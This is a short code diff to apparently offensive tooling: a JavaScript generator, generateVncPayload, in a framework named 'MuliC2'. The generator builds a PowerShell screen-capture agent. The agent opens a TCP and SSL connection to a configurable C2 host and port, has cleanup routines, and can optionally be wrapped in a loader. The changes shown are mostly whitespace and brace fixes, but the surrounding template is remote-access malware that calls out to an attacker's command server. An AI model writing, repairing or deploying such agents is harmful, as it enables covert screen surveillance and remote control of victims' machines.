@@ -1026,7 +1026,7 @@ const generateVncPayload = async () => {
     console.log('VNC Configuration:', { c2Host, c2Port })
     
     let payload = `
-    # MuliC2 VNC Screen Capture Agent
+# MuliC2 VNC Screen Capture Agent
 # C2 Host: ${c2Host}
 # C2 Port: ${c2Port}
 # Type: ${vncForm.value.payloadType}
@@ -1166,7 +1166,6 @@ try {
         throw "Connection to \$C2Host\`:\$C2Port failed or timed out"
     }
     \$global:tcpClient.EndConnect(\$asyncResult)
-    }
     
     Write-Host "[+] TCP connection established" -ForegroundColor Green
     
@@ -1189,7 +1188,7 @@ try {
     # Authenticate SSL connection
     try {
         \$global:sslStream.AuthenticateAsClient(\$C2Host)
-  } catch {
+    } catch {
         throw "SSL authentication failed: \$(\$_.Exception.Message)"
     }
     
@@ -1279,7 +1278,7 @@ try {
 } catch {
     Write-Host "[!] Connection error: \$(\$_.Exception.Message)" -ForegroundColor Red
     Write-Host "[!] Make sure the MuliC2 listener is running on \$C2Host\`:\$C2Port" -ForegroundColor Red
-  } finally {
+} finally {
     # Final cleanup
     if (-not \$global:cleanupInProgress) {
         Invoke-GracefulCleanup \$true
@@ -1295,8 +1294,9 @@ try {
         }
     } catch {}
     
-            Write-Host "[*] MuliC2 VNC agent terminated" -ForegroundColor Yellow
-}`
+    Write-Host "[*] MuliC2 VNC agent terminated" -ForegroundColor Yellow
+}
+`;
     
     // Apply loader if enabled
     if (vncForm.value.useLoader) {
